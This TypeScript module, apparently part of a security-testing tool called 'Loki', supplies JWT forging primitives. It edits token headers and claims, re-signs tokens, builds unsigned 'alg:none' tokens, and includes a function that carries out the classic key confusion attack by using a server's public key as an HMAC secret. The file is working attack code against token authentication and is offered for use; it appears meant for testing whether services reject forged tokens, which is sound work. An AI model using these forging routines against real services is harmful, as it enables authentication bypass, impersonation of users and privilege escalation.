/**
 * Token Forge - JWT manipulation primitives
 *
 * Provides low-level JWT manipulation capabilities for mischief plugins.
 * This is the heart of Loki's token corruption abilities.
 */

import * as jose from "jose";

export interface ForgeableToken {
	/** Original raw JWT string */
	readonly original: string;
	/** Mutable JWT header */
	header: JWTHeader;
	/** Mutable JWT claims/payload */
	claims: JWTClaims;
	/** Current signature (empty string for unsigned) */
	signature: string;
	/** Get the public key used to sign this token */
	getPublicKey(): Promise<string>;
	/** Re-sign the token with a specific algorithm and key */
	sign(alg: string, key: string | Uint8Array | jose.KeyLike): Promise<void>;
	/** Build the final JWT string */
	build(): string;
}

export interface JWTHeader {
	alg: string;
	typ?: string;
	kid?: string;
	[key: string]: unknown;
}

export interface JWTClaims {
	iss?: string;
	sub?: string;
	aud?: string | string[];
	exp?: number;
	nbf?: number;
	iat?: number;
	jti?: string;
	[key: string]: unknown;
}

/**
 * Parse a JWT into a forgeable token
 */
export function parseToken(jwt: string, publicKeyPem?: string): ForgeableToken {
	const parts = jwt.split(".");
	if (parts.length !== 3) {
		throw new Error("Invalid JWT format: expected 3 parts");
	}

	const [headerB64, payloadB64, signatureB64] = parts as [string, string, string];

	const header = JSON.parse(base64UrlDecode(headerB64)) as JWTHeader;
	const claims = JSON.parse(base64UrlDecode(payloadB64)) as JWTClaims;

	let currentSignature = signatureB64;
	let currentHeader = { ...header };
	let currentClaims = { ...claims };

	const token: ForgeableToken = {
		original: jwt,

		get header() {
			return currentHeader;
		},
		set header(value: JWTHeader) {
			currentHeader = value;
		},

		get claims() {
			return currentClaims;
		},
		set claims(value: JWTClaims) {
			currentClaims = value;
		},

		get signature() {
			return currentSignature;
		},
		set signature(value: string) {
			currentSignature = value;
		},

		async getPublicKey(): Promise<string> {
			if (publicKeyPem) {
				return publicKeyPem;
			}
			// If no public key provided, return empty string
			return "";
		},

		async sign(alg: string, key: string | Uint8Array | jose.KeyLike): Promise<void> {
			currentHeader.alg = alg;

			if (alg === "none") {
				currentSignature = "";
				return;
			}

			// Build the signing input
			const headerB64New = base64UrlEncode(JSON.stringify(currentHeader));
			const payloadB64New = base64UrlEncode(JSON.stringify(currentClaims));
			const signingInput = `${headerB64New}.${payloadB64New}`;

			// Sign based on algorithm family
			if (alg.startsWith("HS")) {
				// HMAC signing
				const keyBytes = typeof key === "string" ? new TextEncoder().encode(key) : key;
				const cryptoKey = await crypto.subtle.importKey(
					"raw",
					keyBytes instanceof Uint8Array ? keyBytes : new TextEncoder().encode(String(key)),
					{ name: "HMAC", hash: `SHA-${alg.slice(2)}` },
					false,
					["sign"],
				);
				const signatureBytes = await crypto.subtle.sign(
					"HMAC",
					cryptoKey,
					new TextEncoder().encode(signingInput),
				);
				currentSignature = base64UrlEncodeBytes(new Uint8Array(signatureBytes));
			} else {
				// For RS/PS/ES algorithms, use jose
				const privateKey = typeof key === "string" ? await jose.importPKCS8(key, alg) : key;
				const jws = await new jose.CompactSign(
					new TextEncoder().encode(JSON.stringify(currentClaims)),
				)
					.setProtectedHeader(currentHeader)
					.sign(privateKey);
				const newParts = jws.split(".");
				currentSignature = newParts[2] ?? "";
			}
		},

		build(): string {
			const headerB64 = base64UrlEncode(JSON.stringify(currentHeader));
			const payloadB64 = base64UrlEncode(JSON.stringify(currentClaims));

			if (currentHeader.alg === "none" || currentSignature === "") {
				// For alg:none, some implementations expect trailing dot, some don't
				return `${headerB64}.${payloadB64}.`;
			}

			return `${headerB64}.${payloadB64}.${currentSignature}`;
		},
	};

	return token;
}

/**
 * Create a new token from scratch
 */
export function createToken(header: JWTHeader, claims: JWTClaims): ForgeableToken {
	const headerB64 = base64UrlEncode(JSON.stringify(header));
	const payloadB64 = base64UrlEncode(JSON.stringify(claims));
	const jwt = `${headerB64}.${payloadB64}.`;

	return parseToken(jwt);
}

/**
 * Sign a token with HMAC using a public key as the secret (key confusion attack)
 */
export async function signWithKeyConfusion(
	token: ForgeableToken,
	publicKeyPem: string,
): Promise<void> {
	// Use the public key PEM as the HMAC secret
	// This is the classic key confusion attack
	await token.sign("HS256", publicKeyPem);
}

// === Base64URL utilities ===

function base64UrlEncode(str: string): string {
	return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function base64UrlEncodeBytes(bytes: Uint8Array): string {
	let binary = "";
	for (const byte of bytes) {
		binary += String.fromCharCode(byte);
	}
	return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function base64UrlDecode(str: string): string {
	// Add padding if needed
	let padded = str.replace(/-/g, "+").replace(/_/g, "/");
	while (padded.length % 4) {
		padded += "=";
	}
	return atob(padded);
}
